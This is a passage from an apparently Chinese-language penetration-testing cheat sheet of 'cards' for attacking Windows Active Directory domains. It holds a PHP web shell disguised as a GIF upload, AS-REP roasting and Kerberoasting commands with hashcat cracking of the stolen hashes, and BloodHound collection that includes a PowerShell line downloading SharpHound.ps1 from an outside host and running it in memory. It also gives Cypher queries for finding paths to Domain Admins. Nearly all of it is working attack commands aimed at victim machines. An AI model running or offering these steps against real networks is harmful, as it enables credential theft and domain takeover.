# 内容: GIF89a; <?php system($_GET['c']); ?>
# Content-Type: image/gif → 改 application/x-php
```text

---

## Card 16: AS-REP / Kerberoast

**触发条件**: AS-REP: DONT_REQ_PREAUTH 用户; Kerberoast: 有 SPN 的用户 + 域凭据

### AS-REP Roasting
```bash
# 1. 枚举无预认证用户 (不需要凭据, 只需用户名列表)
impacket-GetNPUsers 'dom.local/' -usersfile users.txt -dc-ip DC -format hashcat
# 成功输出: $krb5asrep$23$user@DOM.LOCAL:...

# 或用 nxc (需要已知用户名列表):
nxc ldap DC -u user -p pass --asreproast asrep.txt
# 无凭据枚举: impacket-GetNPUsers 'dom/' -usersfile users.txt -dc-ip DC -format hashcat

# 2. 破解
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt
```text

### Kerberoasting
```bash
# 1. 枚举有 SPN 的用户
impacket-GetUserSPNs 'dom/user:pass' -dc-ip DC
# 成功输出: svc_sql/SRV01.dom.local  Administrator

# 2. 请求 TGS 票据
impacket-GetUserSPNs 'dom/user:pass' -dc-ip DC -request -outputfile hashes.txt
# 成功输出: $krb5tgs$23$*svc_sql$DOM.LOCAL$...

# 或用 nxc:
nxc ldap DC -u user -p pass --kerberoasting kerb.txt

# 或用 Rubeus (Windows 受害机上):
Rubeus.exe kerberoast /outfile:hashes.txt

# 3. 破解
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# 🔴 如果输出 $18$ (AES256) → 几乎不可爆破 → 放弃, 换委派路径!
# 🔴 Targeted AS-REP (对特定用户, 需 GenericWrite — 设 DONT_REQ_PREAUTH 后 roast):
# bloodyAD -H DC -d dom -u user -p pass add uac target -f DONT_REQ_PREAUTH
```text

📌 完整版见 lateral-movement 卡

---

## Card 17: BloodHound 采集与导入

**触发条件**: 有域凭据 → 分析域攻击路径

### 远程采集 (攻击机)
```bash
# === bloodyAD (Python, 通过 LDAP) ===
bloodyAD -H DC_IP -d dom -u user -p pass get bloodhound
# 成功输出: [*] BloodHound data saved to <timestamp>_bloodhound.zip
# 或指定输出: --output bloodhound.zip

# === bloodhound-python (备选) ===
bloodhound-python -u 'user' -p 'pass' -d dom -dc DC_IP -c All --zip
# 输出: <timestamp>_bloodhound.zip
```text

### 本地采集 (Windows 受害机)
```powershell
# === SharpHound.exe ===
SharpHound.exe -c All --zipfilename bloodhound.zip
# 或只收集关键信息:
SharpHound.exe -c Session,Group,Trusts,ACL --zipfilename bloodhound.zip

# === SharpHound.ps1 (内存执行) ===
iex (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8080/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All --ZipFileName bloodhound.zip
```text

### 导入 BloodHound
```bash
# 1. 启动 neo4j
sudo neo4j console
# 或: sudo systemctl start neo4j

# 2. 启动 BloodHound CE
bloodhound-ce
# 或旧版: bloodhound

# 3. 登录 (默认 neo4j:neo4j → 首次需改密码)
# 4. 拖拽 .zip 文件到界面 → Upload
# 5. 搜索: MATCH (n) RETURN n LIMIT 50

# 🔴 常用 Cypher 查询:
# 找 Domain Admins: MATCH (g:Group {name:'DOMAIN ADMINS@DOM.LOCAL'})-[r:MemberOf*1..]->(u:User) RETURN g,u
# 找 Kerberoastable: MATCH (u:User {hasspn:true}) RETURN u
# 找 AS-REP: MATCH (u:User {dontreqpreauth:true}) RETURN u
# 找机器到机器的 Session: MATCH (c:Computer)-[:HasSession]->(u:User) RETURN c,u
# 最短路径到 DA: MATCH p=shortestPath((s:User {name:'JSMITH@DOM.LOCAL'})-[r*1..]->(t:Group {name:'DOMAIN ADMINS@DOM.LOCAL'})) RETURN p
```text

📌 完整版见 lateral-movement 卡

---

## 通用前置清单（每张卡片执行前跑一遍）

```bash
[1] 🔴 ntpdate -b <DC_IP>                          # 时钟同步 — Kerberos 第一杀手
[2] 🔴 export KRB5CCNAME=xxx.ccache                 # 确认用哪个 TGT
[3] 🔴 klist                                         # 验证 TGT 有效未过期
[4] 🔴 nxc smb DC -k --use-kcache                    # 确认 Kerberos 认证可达
[5] 🔴 隧道验证: ss -tlnp | grep <proxy_port>         # SOCKS 存活？
```text
